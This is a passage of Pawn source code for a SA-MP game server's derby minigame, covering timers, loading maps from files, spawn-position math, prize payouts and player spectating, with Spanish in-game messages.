		if(DI[PLAYERSD] == 0) return CloseDerby();
		else if(DI[PLAYERSD] == 1)
		{
			DI[TEXTDRAW_ANIMATION] ++;
			if(DI[TEXTDRAW_ANIMATION] >= sizeof WaitTextDrawAnimation) DI[TEXTDRAW_ANIMATION] = 0;
			TextDrawSetString(TD_DERBY_Message, WaitTextDrawAnimation[ DI[TEXTDRAW_ANIMATION] ]);
			DI[COUNTDOWN_COUNTER] = DERBY_TIME_COUNTDOWN + 1;
			KillTimer(DI[COUNTDOWN_TIMER]);
			DI[COUNTDOWN_TIMER] = SetTimer("DerbyCountdown", 900, true);
		}
		else StartDerby();
	}
	return 1;
}

StartDerby()
{
	DI[STATUS] = DERBY_RUNNING;
	DI[ACTIVE_PLAYERS] = DI[PLAYERSD];
	DI[MAX_PRIZE] = DI[ACTIVE_PLAYERS] * 750;
	DI[TIME_OUT_COUNTER] = DI[ACTIVE_PLAYERS] * 20;

	TextDrawSetString(TD_DERBY, "_");
	KillTimer(DI[TIME_OUT_TIMER]);
	DI[TIME_OUT_TIMER] = SetTimer("DerbyTimeOut", 1000, true);

	TextDrawSetString(TD_DERBY_Message, "~b~¡Go ~r~go ~y~go!");
	KillTimer(DI[MESSAGE_TIMER]);
	DI[MESSAGE_TIMER] = SetTimerEx("TD_DERBY_SetString", 3000, false, "s", "_");

	for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
	{
		if(IsPlayerConnected(i) && PI[i][P_GAMEMODE] == GAME_DERBY && PI[i][P_DERBY_STATUS] == PD_NORMAL)
		{
			TextDrawShowForPlayer(i, TD_DERBY);
			RepairVehicle(PI[i][P_DERBY_VEHICLEID]);
			SetVehicleParamsEx(PI[i][P_DERBY_VEHICLEID], VEHICLE_PARAMS_ON, VEHICLE_PARAMS_ON, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
		}
	}
	return 1;
}

public DerbyTimeOut()
{
	if(DI[STATUS] != DERBY_RUNNING) KillTimer(DI[TIME_OUT_TIMER]);

	DI[TIME_OUT_COUNTER] --;
	if(DI[TIME_OUT_COUNTER] < 0)
	{
		KillTimer(DI[TIME_OUT_TIMER]);

		for(new playerid = 0, j = MAX_PLAYERS; playerid <= j; playerid++)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PI[playerid][P_GAMEMODE] == GAME_DERBY && PI[playerid][P_DERBY_STATUS] == PD_NORMAL)
				{
					GivePlayerMoney(playerid, DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]);
					new str[128]; format(str, 128, "_~n~_~n~_~n~~y~DERBY_FINALIZADO_~n~~r~~h~p~w~~h~remio:_%d~r~~h~$~n~~g~~h~tiempo:~p~_%s_minutos~n~~r~~h~se acabo el tiempo", DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]);
					TextDrawSetString(TD_DERBY_Message, str);
				}
			}
		}
		DI[ACTIVE_PLAYERS] = 0;
		KillTimer(DI[NEXT_DERBY_TIMER]);
		DI[NEXT_DERBY_TIMER] = SetTimer("NextDerby", 5000, false);
		return 1;
	}

	new str[24];
	format(str, 24, "~r~~h~tiempo:_%s", TimeConvert(DI[TIME_OUT_COUNTER]) ); TextDrawSetString(TD_DERBY, str);
	return 1;
}

public NextDerby()
{
	DI[MAP_ID] ++;

	if(TOTAL_DERBYS == 0)
	{
		SendClientMessageToAll(-1, "No se puede pasar al siguiente derby, no existe.");
		CloseDerby();
		return 0;
	}
	if(TOTAL_DERBYS_OK == 0)
	{
		SendClientMessageToAll(-1, "No se puede pasar al siguiente derby, no puede verificar.");
		CloseDerby();
		return 0;
	}

	new found, id = DI[MAP_ID];
	while(!found)
	{
		if(id >= TOTAL_DERBYS) id = 0;
		if(DERBY_FILE_INFO[id][DERBY_FILE_VALID])
		{
			found = true;
			DI[MAP_ID] = id;
			break;
		}

		id ++;
	}
	if(!LoadDerby(DERBY_FILE_INFO[ DI[MAP_ID] ][DERBY_NAME]))
	{
		CloseDerby();
		SendClientMessageToAll(-1, "Derby no pudo cargar.");
		return 1;
	}

	TextDrawSetString(TD_DERBY, "_");
	TextDrawHideForAll(TD_DERBY);

	KillTimer(DI[TIME_OUT_TIMER]);
	KillTimer(DI[MESSAGE_TIMER]);
	KillTimer(DI[COUNTDOWN_TIMER]);

	DI[STATUS] = DERBY_WAIT;
	DI[ACTIVE_PLAYERS] = 0;
	DI[COUNTDOWN_COUNTER] = DERBY_TIME_COUNTDOWN + 1;
	DI[TEXTDRAW_ANIMATION] = 0;
	TextDrawSetString(TD_DERBY_Message, WaitTextDrawAnimation[ DI[TEXTDRAW_ANIMATION] ]);
	DI[COUNTDOWN_TIMER] = SetTimer("DerbyCountdown", 900, true);
	SendClientMessageToAll(-1, "{FF0000}|Derby| »{EAEAEA}En 30 segundos el {FFFFFF}Derby comenzará! Escribe {A9A9A9}/derby {EAEAEA}para participar");


	for(new players = 0, j = MAX_PLAYERS; players <= j; players++)
	{
		if(IsPlayerConnected(players))
		{
			if(PI[players][P_GAMEMODE] == GAME_DERBY)
			{
				if(GetPlayerState(players) == PLAYER_STATE_SPECTATING) TogglePlayerSpectating(players, false);

				PI[players][P_DERBY_SLOT] = GetDerbyVehicleSlot();
				if(PI[players][P_DERBY_SLOT] == -1) return KickPlayerFromDerby(players, true);
				DERBY_SLOT_USED[ PI[players][P_DERBY_SLOT] ] = true;

				SetPlayerHealth(players, 100.0);
				SetPlayerArmour(players, 0.0);
				SetPlayerInterior(players, 0);
				SetPlayerVirtualWorld(players, DERBY_VIRTUAL_WORLD);

				if(IsValidVehicle(PI[players][P_DERBY_VEHICLEID]) && PI[players][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
				{
					DestroyVehicle(PI[players][P_DERBY_VEHICLEID]);
					PI[players][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
				}
				TogglePlayerControllable(players, true);
				PI[players][P_DERBY_STATUS] = PD_NORMAL;
				PI[players][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[players][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[players][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[players][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[players][P_DERBY_SLOT] ][3], -1, -1, -1, false);
				SetVehicleParamsEx(PI[players][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
				SetVehicleVirtualWorld(PI[players][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
				PutPlayerInVehicle(players, PI[players][P_DERBY_VEHICLEID], 0);
				TextDrawShowForPlayer(players, TD_DERBY_Message);
				GameTextForPlayer(players, DI[NAME], 3000, 6);
			}
		}
	}

	return 1;
}

public TD_DERBY_SetString(text[])
{
	return TextDrawSetString(TD_DERBY_Message, text);
}

CloseDerby()
{
	for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PI[i][P_GAMEMODE] == GAME_DERBY)
			{
				KickPlayerFromDerby(i, true);
			}
		}
	}

	KillTimer(DI[COUNTDOWN_TIMER]);
	KillTimer(DI[TIME_OUT_TIMER]);
	KillTimer(DI[NEXT_DERBY_TIMER]);

	TextDrawSetString(TD_DERBY_Message, "_");
	TextDrawSetString(TD_DERBY, "_");
	new tmp[DERBY_INFO], Float:tmp3[MAX_DERBY_PLAYERS][4], tmp4[MAX_DERBY_PLAYERS], old_id = DI[MAP_ID];
	DI = tmp;
	DERBY_SPAWN_POS = tmp3;
	DERBY_SLOT_USED = tmp4;

	for(new i = 0; i != MAX_DERBY_OBJECTS; i ++)
	{
		if(DERBY_OBJECTS[i][OBJECT_ID] != INVALID_OBJECT_ID && IsValidDynamicObject(DERBY_OBJECTS[i][OBJECT_ID])) DestroyDynamicObject(DERBY_OBJECTS[i][OBJECT_ID]);
        DERBY_OBJECTS[i][OBJECT_ID] = INVALID_OBJECT_ID;
        DERBY_OBJECTS[i][OBJECT_MODELID] = 0;
        DERBY_OBJECTS[i][OBJECT_POS][0] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][1] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][2] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][3] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][4] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][5] = 0.0;
	}

	DI[MAP_ID] = old_id;
	return 1;
}

LoadDerbyNames(mapname[])
{
	new File:Handler = fopen(mapname, io_read);
    if(!Handler)
	{
		printf("--- Error cargando '%s', no se encontró la lista de mapas derby.", mapname);
		return 0;
	}

    for(new i = 0; i != sizeof DERBY_FILE_INFO; i ++)
	{
		DERBY_FILE_INFO[i][DERBY_NAME] = EOS;
		DERBY_FILE_INFO[i][DERBY_FILE_EXISTS] = false;
		DERBY_FILE_INFO[i][DERBY_FILE_VALID] = false;
	}

    TOTAL_DERBYS = 0;

    while(fread(Handler, Object_String))
    {
        StripNewLine(Object_String);
		if(!isnull(Object_String))
		{
			if(TOTAL_DERBYS >= MAX_DERBYS)
			{
				printf("--- Error, se ha supero el límite (%d) de mapas derby.", MAX_DERBYS);
				return 0;
			}
			DERBY_FILE_INFO[ TOTAL_DERBYS ][DERBY_FILE_EXISTS] = true;
			format(DERBY_FILE_INFO[ TOTAL_DERBYS ][DERBY_NAME], 24, "%s", Object_String);
			TOTAL_DERBYS ++;
		}
    }

    fclose(Handler);

	if(TOTAL_DERBYS == 0)
	{
		printf("--- Error cargando la lista de derbys '%s', no se encontró ningún derby.", mapname);
		return 0;
	}
    printf("--- LISTA '%s' OK. Se importaron %d mapas derby.", mapname, TOTAL_DERBYS);
	return 1;
}

CheckDerbys()
{
	if(TOTAL_DERBYS == 0)
	{
		printf("--- Error comprobando los derbys, no se importó ningún mapa desde la lista o esta no fue cargada.");
		return 0;
	}

	for(new i = 0; i != sizeof DERBY_FILE_INFO; i ++) DERBY_FILE_INFO[i][DERBY_FILE_VALID] = false;

	TOTAL_DERBYS_OK = 0;
	for(new i = 0; i != TOTAL_DERBYS; i ++)
	{
		if(DERBY_FILE_INFO[i][DERBY_FILE_EXISTS]) CheckDerbyFile(i);
	}
	if(TOTAL_DERBYS_OK == 0) print("--- No se pudo verificar ningún mapa, compruebelos.");
	else printf("--- Se han verificado %d de los %d mapas importados.", TOTAL_DERBYS_OK, TOTAL_DERBYS);
	return 1;
}

LoadDerby(mapname[])
{
	new File:Handler = fopen(mapname, io_read);
    if(!Handler)
	{
		printf("--- Error cargando '%s', archivo no encontrado.", mapname);
		return 0;
	}

	new tmp[DERBY_INFO], tmp2[DERBY_OBJECTS_INFO], Float:tmp3[MAX_DERBY_PLAYERS][4], tmp4[MAX_DERBY_PLAYERS], object_count, pos_count, txt_line;
	tmp = DI;
	DERBY_SPAWN_POS = tmp3;
	DERBY_SLOT_USED = tmp4;

	for(new i = 0; i != MAX_DERBY_OBJECTS; i ++)
	{
		if(DERBY_OBJECTS[i][OBJECT_ID] != INVALID_OBJECT_ID && IsValidDynamicObject(DERBY_OBJECTS[i][OBJECT_ID])) DestroyDynamicObject(DERBY_OBJECTS[i][OBJECT_ID]);
        DERBY_OBJECTS[i][OBJECT_ID] = INVALID_OBJECT_ID;
        DERBY_OBJECTS[i][OBJECT_MODELID] = 0;
        DERBY_OBJECTS[i][OBJECT_POS][0] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][1] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][2] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][3] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][4] = 0.0;
        DERBY_OBJECTS[i][OBJECT_POS][5] = 0.0;
	}

    while(fread(Handler, Object_String))
    {
        StripNewLine(Object_String);
		if(!isnull(Object_String))
		{
			if(txt_line == 0)
			{
				if(!sscanf(Object_String, "p<,>s[24]d", 	tmp[NAME], tmp[MODELID]))
				{
					DI = tmp;
					if(DI[MODELID] < 400 || DI[MODELID] > 611)
					{
						printf("--- Error cargando '%s', el módelo de vehículo no es correcto, revíselo.", mapname);
						fclose(Handler);
						return 0;
					}
				}
				else
				{
					printf("--- Error cargando '%s', el formato primera línea no válido, revíselo.", mapname);
					fclose(Handler);
					return 0;
				}
			}
			else
			{
				if(!sscanf(Object_String, "p<,>dffffff", 	tmp2[OBJECT_MODELID], tmp2[OBJECT_POS][0], tmp2[OBJECT_POS][1], tmp2[OBJECT_POS][2],
															tmp2[OBJECT_POS][3], tmp2[OBJECT_POS][4], tmp2[OBJECT_POS][5])
				)
				{
					if(object_count > MAX_DERBY_OBJECTS)
					{
						printf("--- Error cargando '%s', el mapa supera el máximo de objetos permitidos (%d).", mapname, MAX_DERBY_OBJECTS);
						fclose(Handler);
						return 0;
					}
					DERBY_OBJECTS[object_count] = tmp2;
					DERBY_OBJECTS[object_count][OBJECT_ID] = CreateDynamicObject(
																					DERBY_OBJECTS[object_count][OBJECT_MODELID],
																					DERBY_OBJECTS[object_count][OBJECT_POS][0],
																					DERBY_OBJECTS[object_count][OBJECT_POS][1],
																					DERBY_OBJECTS[object_count][OBJECT_POS][2],
																					DERBY_OBJECTS[object_count][OBJECT_POS][3],
																					DERBY_OBJECTS[object_count][OBJECT_POS][4],
																					DERBY_OBJECTS[object_count][OBJECT_POS][5],
																					DERBY_VIRTUAL_WORLD
																				);

					if(object_count == 0) DI[ZPOS] = DERBY_OBJECTS[object_count][OBJECT_POS][2];
					if(DERBY_OBJECTS[object_count][OBJECT_POS][2] < DI[ZPOS]) DI[ZPOS] = DERBY_OBJECTS[object_count][OBJECT_POS][2];

					new Float:pos[6];
					if(AutoPositionOffsets(DERBY_OBJECTS[object_count][OBJECT_MODELID], pos[0], pos[1], pos[2], pos[3], pos[4], pos[5]))
					{
						if(DERBY_OBJECTS[object_count][OBJECT_POS][3] == 0.0 && DERBY_OBJECTS[object_count][OBJECT_POS][4] == 0.0)
						{
							if(pos_count >= MAX_DERBY_PLAYERS) continue;

							new Float:unused_rot[2];
							conversion(DERBY_OBJECTS[object_count][OBJECT_POS][0], DERBY_OBJECTS[object_count][OBJECT_POS][1], DERBY_OBJECTS[object_count][OBJECT_POS][2], DERBY_OBJECTS[object_count][OBJECT_POS][3], DERBY_OBJECTS[object_count][OBJECT_POS][4], DERBY_OBJECTS[object_count][OBJECT_POS][5], pos[0], pos[1], pos[2], pos[3], pos[4], pos[5], DERBY_SPAWN_POS[pos_count][0], DERBY_SPAWN_POS[pos_count][1], DERBY_SPAWN_POS[pos_count][2], unused_rot[0], unused_rot[1], DERBY_SPAWN_POS[pos_count][3]);
							pos_count ++;
						}
					}

					object_count ++;
				}
				else
				{
					printf("--- Error cargando '%s', se esperaba el formato 'modelid, x, y, z, rx, ry, rz' Revisa el mapa.", mapname);
					fclose(Handler);
					return 0;
				}
			}
			txt_line ++;
		}
	}
	fclose(Handler);

	DI[ZPOS] -= 10.0;
	if(DI[ZPOS] < 0.0) DI[ZPOS] = 0.0;

	if(txt_line < 4)
	{
		printf("--- Error cargando '%s', tamaño del mapa demasiado pequeño para ser válido, revíselo.", mapname);
		return 0;
	}
	if(pos_count < MAX_DERBY_PLAYERS)
	{
		printf("--- Error cargando '%s', solo se pudieron obtener %d de %d posiciones.", mapname, pos_count, MAX_DERBY_PLAYERS);
		return 0;
	}
	return 1;
}

/*stock StripNewLine(string[]) //DracoBlue (bugfix idea by Y_Less)
{
	new len = strlen(string);
	if (string[0]==0) return ;
	if ((string[len - 1] == '\n') || (string[len - 1] == '\r')) {
		string[len - 1] = 0;
		if (string[0]==0) return ;
		if ((string[len - 2] == '\n') || (string[len - 2] == '\r')) string[len - 2] = 0;
	}
}*/

//-------------------------------------------------- STYLOCK --------------------------------------------------

conversion(Float:or_pos_x, Float:or_pos_y, Float:or_pos_z, Float:or_rot_x, Float:or_rot_y, Float:or_rot_z, Float:off_x, Float:off_y, Float:off_z, Float:rot_x, Float:rot_y, Float:rot_z, &Float:X, &Float:Y, &Float:Z, &Float:RX, &Float:RY, &Float:RZ) // By Stylock - http://forum.sa-mp.com/member.php?u=114165
{
	static
		Float:sin[3],
		Float:cos[3],
		Float:pos[3],
		Float:rot[3];

	pos[0] = or_pos_x;
	pos[1] = or_pos_y;
	pos[2] = or_pos_z;
	rot[0] = or_rot_x;
	rot[1] = or_rot_y;
	rot[2] = or_rot_z;

	EDIT_FloatEulerFix(rot[0], rot[1], rot[2]);
	cos[0] = floatcos(rot[0], degrees); cos[1] = floatcos(rot[1], degrees); cos[2] = floatcos(rot[2], degrees); sin[0] = floatsin(rot[0], degrees); sin[1] = floatsin(rot[1], degrees); sin[2] = floatsin(rot[2], degrees);
	pos[0] = pos[0] + off_x * cos[1] * cos[2] - off_x * sin[0] * sin[1] * sin[2] - off_y * cos[0] * sin[2] + off_z * sin[1] * cos[2] + off_z * sin[0] * cos[1] * sin[2];
	pos[1] = pos[1] + off_x * cos[1] * sin[2] + off_x * sin[0] * sin[1] * cos[2] + off_y * cos[0] * cos[2] + off_z * sin[1] * sin[2] - off_z * sin[0] * cos[1] * cos[2];
	pos[2] = pos[2] - off_x * cos[0] * sin[1] + off_y * sin[0] + off_z * cos[0] * cos[1];
	rot[0] = asin(cos[0] * cos[1]); rot[1] = atan2(sin[0], cos[0] * sin[1]) + rot_z; rot[2] = atan2(cos[1] * cos[2] * sin[0] - sin[1] * sin[2], cos[2] * sin[1] - cos[1] * sin[0] * -sin[2]);
	cos[0] = floatcos(rot[0], degrees); cos[1] = floatcos(rot[1], degrees); cos[2] = floatcos(rot[2], degrees); sin[0] = floatsin(rot[0], degrees); sin[1] = floatsin(rot[1], degrees); sin[2] = floatsin(rot[2], degrees);
	rot[0] = asin(cos[0] * sin[1]); rot[1] = atan2(cos[0] * cos[1], sin[0]); rot[2] = atan2(cos[2] * sin[0] * sin[1] - cos[1] * sin[2], cos[1] * cos[2] + sin[0] * sin[1] * sin[2]);
	cos[0] = floatcos(rot[0], degrees); cos[1] = floatcos(rot[1], degrees); cos[2] = floatcos(rot[2], degrees); sin[0] = floatsin(rot[0], degrees); sin[1] = floatsin(rot[1], degrees); sin[2] = floatsin(rot[2], degrees);
	rot[0] = atan2(sin[0], cos[0] * cos[1]) + rot_x; rot[1] = asin(cos[0] * sin[1]); rot[2] = atan2(cos[2] * sin[0] * sin[1] + cos[1] * sin[2], cos[1] * cos[2] - sin[0] * sin[1] * sin[2]);
	cos[0] = floatcos(rot[0], degrees); cos[1] = floatcos(rot[1], degrees); cos[2] = floatcos(rot[2], degrees); sin[0] = floatsin(rot[0], degrees); sin[1] = floatsin(rot[1], degrees); sin[2] = floatsin(rot[2], degrees);
	rot[0] = asin(cos[1] * sin[0]); rot[1] = atan2(sin[1], cos[0] * cos[1]) + rot_y; rot[2] = atan2(cos[0] * sin[2] - cos[2] * sin[0] * sin[1], cos[0] * cos[2] + sin[0] * sin[1] * sin[2]);
	X = pos[0];
	Y = pos[1];
	Z = pos[2];
	RX = rot[0];
	RY = rot[1];
 	RZ = rot[2];
}


EDIT_FloatEulerFix(&Float:rot_x, &Float:rot_y, &Float:rot_z)
{
    EDIT_FloatGetRemainder(rot_x, rot_y, rot_z);
    if((!floatcmp(rot_x, 0.0) || !floatcmp(rot_x, 360.0))
    && (!floatcmp(rot_y, 0.0) || !floatcmp(rot_y, 360.0)))
    {
        rot_y = 0.0000002;
    }
    return 1;
}

EDIT_FloatGetRemainder(&Float:rot_x, &Float:rot_y, &Float:rot_z)
{
    EDIT_FloatRemainder(rot_x, 360.0);
    EDIT_FloatRemainder(rot_y, 360.0);
    EDIT_FloatRemainder(rot_z, 360.0);
    return 1;
}

EDIT_FloatRemainder(&Float:remainder, Float:value)
{
    if(remainder >= value)
    {
        while(remainder >= value)
        {
            remainder = remainder - value;
        }
    }
    else if(remainder < 0.0)
    {
        while(remainder < 0.0)
        {
            remainder = remainder + value;
        }
    }
    return 1;
}

//-------------------------------------------------- STYLOCK --------------------------------------------------

GetDerbyVehicleSlot()
{
	for(new i = 0; i != MAX_DERBY_PLAYERS; i ++)
	{
		if(!DERBY_SLOT_USED[i]) return i;
	}
	return -1;
}

PlayerDerbyDead(playerid)
{
	if(PI[playerid][P_DERBY_STATUS] == PD_DEAD) return 1;
	PI[playerid][P_DERBY_STATUS] = PD_DEAD;
	if(IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
	{
		DestroyVehicle(PI[playerid][P_DERBY_VEHICLEID]);
		PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
	}

	GivePlayerMoney(playerid, DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]); // premio
	new str[128]; format(str, 128, "", PI[playerid][P_NAME], DI[ACTIVE_PLAYERS], DI[PLAYERSD], (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]) );
	//SendClientMessageToAll(-1, str);

	DI[ACTIVE_PLAYERS] --;
	if(DI[TIME_OUT_COUNTER] > (DI[ACTIVE_PLAYERS] * 20) ) DI[TIME_OUT_COUNTER] = DI[ACTIVE_PLAYERS] * 20;

	if(DI[ACTIVE_PLAYERS] == 1)
	{
		new winner;
		for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PI[i][P_GAMEMODE] == GAME_DERBY)
				{
					if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
					{
						winner = i;
						SetPlayerScore(winner, GetPlayerScore(winner) + DERBY_WINNER_SCORE);
						GivePlayerMoney(winner, DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]);
						format(str, 128, "{FFFFFF}Eres el ganador del derby, has ganado {00FF00}%d$ {FFFFFF}y %d de score", (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
						SendClientMessage(winner, -1, str);
						break;
					}
				}
			}
		}
		KillTimer(DI[TIME_OUT_TIMER]);
		format(str, 128, "~g~~h~ganador: ~y~%s~n~~p~+5 score~n~~g~~h~+%d$", PI[winner][P_NAME], (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
		TextDrawSetString(TD_DERBY_Message, str);

		format(str, 128, "{00FFFF}%s {FFFFFF}ha ganado el derby premio {00FF00}$%d {FFFFFF}y {FF0015}%d {FFFFFF}score", PI[winner][P_NAME], (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
		SendClientMessageToAll(-1, str);

		TextDrawSetString(TD_DERBY, "_");
		TextDrawHideForAll(TD_DERBY);
		TogglePlayerSpectating(playerid, true);
		PlayerSpectateVehicle(playerid, PI[winner][P_DERBY_VEHICLEID]);

		KillTimer(DI[NEXT_DERBY_TIMER]);
		DI[NEXT_DERBY_TIMER] = SetTimer("NextDerby", 5000, false);
		return 1;
	}
	else
	{
		PI[playerid][P_DERBY_STATUS] = PD_DEAD;
		for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PI[i][P_GAMEMODE] == GAME_DERBY)
				{
					if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
					{
						PI[playerid][P_DERBY_SPECTATEPLAYER] = i;
						break;
					}
				}
			}
		}
		TogglePlayerSpectating(playerid, true);
		PlayerSpectateVehicle(playerid, PI[ PI[playerid][P_DERBY_SPECTATEPLAYER] ][P_DERBY_VEHICLEID]);
		SendClientMessage(playerid, -1, "Presiona la tecla {45D0FF}INTRO {FFFFFF}para cambiar de jugador.");
	}
	return 1;
}


KickPlayerFromDerby(playerid, freeroam = false)
{
	if(PI[playerid][P_GAMEMODE] != GAME_DERBY) return 0;

	if( (DI[STATUS] == DERBY_RUNNING) && PI[playerid][P_DERBY_STATUS] == PD_NORMAL)
	{
		DI[ACTIVE_PLAYERS] --;
		if(DI[TIME_OUT_COUNTER] > (DI[ACTIVE_PLAYERS] * 20) ) DI[TIME_OUT_COUNTER] = DI[ACTIVE_PLAYERS] * 20;
	}
	DI[PLAYERSD] --;

	TextDrawHideForPlayer(playerid, TD_DERBY);
	TextDrawHideForPlayer(playerid, TD_DERBY_Message);

	DERBY_SLOT_USED[ PI[playerid][P_DERBY_SLOT] ] = false;
	SetPlayerVirtualWorld(playerid, FREEROAM_VIRTUAL_WORLD);
	SetPlayerInterior(playerid, 0);
	SetPlayerArmour(playerid, 0.0);
	SetPlayerHealth(playerid, 100.0);
	PI[playerid][P_DERBY_SLOT] = 0;
	PI[playerid][P_DERBY_STATUS] = PD_NORMAL;
	TogglePlayerControllable(playerid, true);
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) TogglePlayerSpectating(playerid, false);
	if(IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
	{
		DestroyVehicle(PI[playerid][P_DERBY_VEHICLEID]);
		PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
	}
	SetCameraBehindPlayer(playerid);
	PI[playerid][P_GAMEMODE] = GAME_NONE;

	if(freeroam)
	{
		PI[playerid][P_GAMEMODE] = GAME_FREEROAM;
		SetPlayerPos(playerid, FREEROAM_POS[0], FREEROAM_POS[1], FREEROAM_POS[2]);
		SetPlayerFacingAngle(playerid, FREEROAM_POS[3]);
		SetSpawnInfo(playerid, GetPlayerTeam(playerid), GetPlayerSkin(playerid), FREEROAM_POS[0], FREEROAM_POS[1], FREEROAM_POS[2], FREEROAM_POS[3], 0, 0, 0, 0, 0, 0);
		ResetPlayerWeapons(playerid);
	}

	CheckDerby();
	return 1;
}

CheckDerby()
{
	if(DI[PLAYERSD] <= 0 && DI[STATUS] != DERBY_CLOSED) return CloseDerby();
	switch(DI[STATUS])
	{
		case DERBY_CLOSED: return 1;
		case DERBY_RUNNING:
		{
			if(DI[ACTIVE_PLAYERS] == 1)
			{
				new winner, str[128];
				for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PI[i][P_GAMEMODE] == GAME_DERBY)
						{
							if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
							{
								winner = i;
								SetPlayerScore(winner, GetPlayerScore(winner) + DERBY_WINNER_SCORE);
								GivePlayerMoney(winner, DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]);
								format(str, 128, "Eres el ganador del derby, has ganado %d$ y %d de score", (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
								SendClientMessage(winner, -1, str);
								break;
							}
						}
					}
				}
				KillTimer(DI[TIME_OUT_TIMER]);
				format(str, 128, "~g~~h~ganador: ~y~%s~n~~p~+5 score~n~~g~~h~+%d$", PI[winner][P_NAME], (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
				TextDrawSetString(TD_DERBY_Message, str);

				format(str, 128, "{FFFFFF}Eres el ganador del derby, has ganado {00FF00}%d$ {FFFFFF}y %d de score", PI[winner][P_NAME], (DI[MAX_PRIZE] / DI[ACTIVE_PLAYERS]), DERBY_WINNER_SCORE);
				SendClientMessageToAll(-1, str);

				TextDrawSetString(TD_DERBY, "_");
				TextDrawHideForAll(TD_DERBY);

				KillTimer(DI[NEXT_DERBY_TIMER]);
				DI[NEXT_DERBY_TIMER] = SetTimer("NextDerby", 5000, false);
			}
			return 1;
		}
	}
	return 1;
}

CheckDerbyFile(id)
{
	new mapname[24]; format(mapname, 24, "%s", DERBY_FILE_INFO[id][DERBY_NAME]);

	new File:Handler = fopen(mapname, io_read);
    if(!Handler)
	{
		printf("--- COMPROBACION: Error cargando '%s', archivo no encontrado.", mapname);
		return 0;
	}

	new tmp[DERBY_INFO], tmp2[DERBY_OBJECTS_INFO], object_count, pos_count, txt_line;

    while(fread(Handler, Object_String))
    {
        StripNewLine(Object_String);
		if(!isnull(Object_String))
		{
			if(txt_line == 0)
			{
				if(!sscanf(Object_String, "p<,>s[24]d", 	tmp[NAME], tmp[MODELID]))
				{
					if(tmp[MODELID] < 400 || tmp[MODELID] > 611)
					{
						printf("--- COMPROBACION: Error cargando '%s', el módelo de vehículo no es correcto, revíselo.", mapname);
						printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
						fclose(Handler);
						return 0;
					}
				}
				else
				{
					printf("--- COMPROBACION: Error cargando '%s', el formato primera línea no válido, revíselo.", mapname);
					printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
					fclose(Handler);
					return 0;
				}
			}
			else
			{
				if(!sscanf(Object_String, "p<,>dffffff", 	tmp2[OBJECT_MODELID], tmp2[OBJECT_POS][0], tmp2[OBJECT_POS][1], tmp2[OBJECT_POS][2],
															tmp2[OBJECT_POS][3], tmp2[OBJECT_POS][4], tmp2[OBJECT_POS][5])
				)
				{
					if(object_count > MAX_DERBY_OBJECTS)
					{
						printf("--- COMPROBACION: Error cargando '%s', el mapa supera el máximo de objetos permitidos (%d).", mapname, MAX_DERBY_OBJECTS);
						printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
						fclose(Handler);
						return 0;
					}

					new Float:pos[6];
					if(AutoPositionOffsets(tmp2[OBJECT_MODELID], pos[0], pos[1], pos[2], pos[3], pos[4], pos[5]))
					{
						if(tmp2[OBJECT_POS][3] == 0.0 && tmp2[OBJECT_POS][4] == 0.0)
						{
							if(pos_count >= MAX_DERBY_PLAYERS) continue;
							pos_count ++;
						}
					}

					object_count ++;
				}
				else
				{
